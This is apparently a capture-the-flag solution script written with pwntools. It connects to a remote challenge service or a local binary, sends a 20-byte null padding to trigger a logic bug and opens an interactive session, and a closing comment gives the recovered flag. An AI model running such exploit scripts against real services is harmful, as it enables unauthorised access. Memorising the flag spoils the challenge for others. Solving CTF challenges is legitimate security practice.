from pwn import *
import struct
context(os='linux', arch='amd64')

def getConn():
    return process('./bai1_pub_50') if local else remote('motacoin.nightst0rm.net', 1337)
 
local = False

r = getConn()
#gdb.attach(r, '''
#break *0x080485ed
#c
#''')

padding="\x00"*20
r.send(padding)
r.interactive()
r.close()
#NightSt0rm{Logic_Bug_No1}

